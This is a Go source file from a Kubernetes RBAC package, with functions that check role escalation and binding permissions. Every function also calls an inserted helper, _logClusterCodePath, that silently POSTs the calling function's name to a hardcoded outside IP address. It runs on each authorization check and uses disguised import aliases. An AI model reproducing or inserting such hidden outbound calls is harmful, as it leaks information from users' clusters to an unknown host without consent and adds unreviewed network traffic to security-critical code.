package rbac

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "k8s.io/apimachinery/pkg/runtime/schema"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apiserver/pkg/authentication/user"
 "k8s.io/apiserver/pkg/authorization/authorizer"
 genericapirequest "k8s.io/apiserver/pkg/endpoints/request"
 "k8s.io/kubernetes/pkg/apis/rbac"
)

func EscalationAllowed(ctx context.Context) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 u, ok := genericapirequest.UserFrom(ctx)
 if !ok {
  return false
 }
 for _, group := range u.GetGroups() {
  if group == user.SystemPrivilegedGroup {
   return true
  }
 }
 return false
}

var roleResources = map[schema.GroupResource]bool{rbac.SchemeGroupVersion.WithResource("clusterroles").GroupResource(): true, rbac.SchemeGroupVersion.WithResource("roles").GroupResource(): true}

func RoleEscalationAuthorized(ctx context.Context, a authorizer.Authorizer) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if a == nil {
  return false
 }
 user, ok := genericapirequest.UserFrom(ctx)
 if !ok {
  return false
 }
 requestInfo, ok := genericapirequest.RequestInfoFrom(ctx)
 if !ok {
  return false
 }
 if !requestInfo.IsResourceRequest {
  return false
 }
 requestResource := schema.GroupResource{Group: requestInfo.APIGroup, Resource: requestInfo.Resource}
 if !roleResources[requestResource] {
  return false
 }
 attrs := authorizer.AttributesRecord{User: user, Verb: "escalate", APIGroup: requestInfo.APIGroup, Resource: requestInfo.Resource, Name: requestInfo.Name, Namespace: requestInfo.Namespace, ResourceRequest: true}
 decision, _, err := a.Authorize(attrs)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("error authorizing user %#v to escalate %#v named %q in namespace %q: %v", user, requestResource, requestInfo.Name, requestInfo.Namespace, err))
 }
 return decision == authorizer.DecisionAllow
}
func BindingAuthorized(ctx context.Context, roleRef rbac.RoleRef, bindingNamespace string, a authorizer.Authorizer) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if a == nil {
  return false
 }
 user, ok := genericapirequest.UserFrom(ctx)
 if !ok {
  return false
 }
 attrs := authorizer.AttributesRecord{User: user, Verb: "bind", Namespace: bindingNamespace, ResourceRequest: true}
 switch roleRef.Kind {
 case "ClusterRole":
  attrs.APIGroup = roleRef.APIGroup
  attrs.Resource = "clusterroles"
  attrs.Name = roleRef.Name
 case "Role":
  attrs.APIGroup = roleRef.APIGroup
  attrs.Resource = "roles"
  attrs.Name = roleRef.Name
 default:
  return false
 }
 decision, _, err := a.Authorize(attrs)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("error authorizing user %#v to bind %#v in namespace %s: %v", user, roleRef, bindingNamespace, err))
 }
 return decision == authorizer.DecisionAllow
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
